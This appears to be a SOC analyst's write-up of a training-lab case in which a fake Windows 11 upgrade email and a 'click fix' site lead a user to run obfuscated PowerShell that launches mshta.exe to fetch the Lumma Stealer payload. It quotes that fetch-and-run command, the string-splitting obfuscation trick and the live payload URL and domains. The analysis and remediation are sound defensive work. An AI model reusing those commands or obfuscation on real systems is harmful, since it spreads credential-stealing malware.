# SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing

## Executive Summary

On March 13, 2025, the Security Operations Center (SOC) detected a critical incident involving the **Lumma Stealer** malware on the host of user **Dylan**. The investigation confirmed a successful, multi-stage phishing attack. The user was lured by an email impersonating a Windows 11 upgrade offer, which led them to a malicious website. This website used a "click fix" or "reCAPTCHA" social engineering tactic to trick the user into running obfuscated PowerShell commands. These commands leveraged `mshta.exe` to download and execute the Lumma Stealer payload from a remote server. The `Device Action: Allowed` on the initial email and the subsequent successful execution of the PowerShell commands confirm a full host compromise.

## Incident Details

The initial alert was triggered by a phishing email associated with the Lumma Stealer campaign:

<img width="1464" height="511" alt="image" src="https://github.com/user-attachments/assets/cc088a3a-134b-4430-8fe4-40ba83e194c5" />

| | |
| :--- | :--- |
| **Date of Incident**| March 13, 2025 |
| **Attacker SMTP IP**| 132.232.40.201 |
| **Phishing Site**| `www[.]windows-update[.]site` |
| **Payload URL**| `https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4` |
| **Recipient User**| dylan@letsdefend.io |
| **Malware Family**| Lumma Stealer |
| **Attack Type**| Phishing / LOLBin Execution |
| **Case Link**| *([Case link ](https://app.letsdefend.io/case-management/casedetail/sohankanna/316))* |

## Investigation and Analysis

### 1. Alert Context: Lumma Stealer and "Click Fix" Phishing

**Lumma Stealer** is a prominent Malware-as-a-Service (MaaS) information stealer. Its primary function is to steal sensitive data from a victim's machine, including cryptocurrency wallets, browser cookies, saved passwords, and system information.

**"Click Fix" Phishing** is a social engineering technique where a malicious website presents a fake problem (e.g., a failed reCAPTCHA, a blurry video, a file that won't download) and provides a "fix" in the form of a button. When the user clicks the button, it copies a malicious script to their clipboard and instructs them to paste it into a PowerShell or Command Prompt window. The user, believing they are fixing a technical issue, inadvertently executes the malware themselves.

### 2. Reconstructing the Attack Chain

The investigation revealed a clear, step-by-step attack chain from email to execution.

**Stage 1: The Phishing Lure**
The attack began with a phishing email with the subject "Upgrade your system to Windows 11 Pro for FREE." The `Device Action: Allowed` confirms it was successfully delivered to the user `Dylan`.
<img width="1477" height="641" alt="image" src="https://github.com/user-attachments/assets/95c02329-25f0-4cc5-b886-5c2c24f205a4" />

**Stage 2: User Clicks and Navigates to Malicious Site**
Endpoint security logs confirm the user fell for the phish. The browser history shows that `chrome.exe` navigated to the malicious phishing site `www[.]windows-update[.]site`.
<img width="1518" height="715" alt="image" src="https://github.com/user-attachments/assets/038fa69c-e0dc-4d74-86ed-8815aab7c47d" />

**Stage 3: Malicious PowerShell Execution (LOLBin Attack)**
Within seconds of visiting the site, the endpoint logs show multiple `PowerShell.exe` processes being executed. This is the "smoking gun," proving the user followed the "click fix" instructions and ran the attacker's code.

<img width="1492" height="621" alt="image" src="https://github.com/user-attachments/assets/ca4ba5ec-a2fa-463c-9dae-3f3014d7ee96" />

The commands are designed to download and run a payload using `mshta.exe`, a legitimate Windows binary (a LOLBin). The attacker uses several variations to evade detection:
*   **Obfuscated Command:** `('ms]]]ht]]]a]]].]]]exe ...' -replace ']')` - This breaks up the string "mshta.exe" with extra characters that are then removed by the `-replace` operator. This is designed to fool simple signature-based security tools.
*   **Hidden Window:** The `-w 1` parameter is used to run the PowerShell window in a hidden state so it is not visible to the user.
*   **The Payload:** The ultimate goal of all commands is to execute `mshta.exe https://overcoatpassably.shop/.../maloy.mp4`. The `.mp4` file is not a video; it is a malicious script (likely VBScript or JScript) disguised with a benign extension to bypass content filters. This script is the Lumma Stealer payload.

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR, Email Security Gateway
*   **Skills Demonstrated:** Phishing Analysis, Social Engineering Triage, PowerShell Deobfuscation, LOLBin Technique Recognition (mshta.exe), Attack Chain Reconstruction.

## Playbook Solution: Incident Classification

*   **Is Traffic Malicious?** **Yes.** The activity involves a phishing site and the execution of obfuscated, malicious PowerShell commands.
*   **What Is The Attack Type?** **Phishing / Malware Infection.**
*   **Was the Attack Successful?** **Yes.** The user clicked the link and executed the malicious PowerShell, compromising the host.
*   **Do You Need Tier 2 Escalation?** **Yes.** A successful infostealer infection is a critical incident that requires full IR.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC338 was a **true positive** for a successful Lumma Stealer infection. The attacker used a sophisticated phishing campaign to trick the user into executing malicious PowerShell commands, leading to a full host compromise. The host and all credentials stored on it must be considered compromised.

**Recommendations:**

1.  **CONTAINMENT - Isolate Host Immediately:** Disconnect the user's machine from the network to prevent the Lumma Stealer from exfiltrating stolen data and to sever any C2 connection.
2.  **CREDENTIALS - Reset Everything:** The user `Dylan's` password must be reset immediately. Furthermore, because Lumma Stealer targets browser-saved credentials, all of the user's personal and corporate passwords that might have been saved in their browser must be considered compromised and should be reset.
3.  **ESCALATE:** Immediately escalate this incident to the Tier 2/Incident Response (IR) team for a full forensic investigation.
4.  **INVESTIGATION:** The IR team must analyze the host to confirm what data was stolen and check for any signs of persistence or deployment of secondary malware.
5.  **RECOVERY:** The compromised host cannot be trusted and must be wiped and re-imaged from a known-good source.
6.  **BLOCK INDICATORS:** Block the following indicators at the perimeter:
    *   **IP:** `132.232.40.201`.
    *   **Domains:** `windows-update.site`, `overcoatpassably.shop`.
7.  **USER AWARENESS:** The user `Dylan` should be enrolled in remedial security training. This incident should also be used to create a company-wide awareness bulletin about "click fix" and reCAPTCHA-themed phishing attacks.













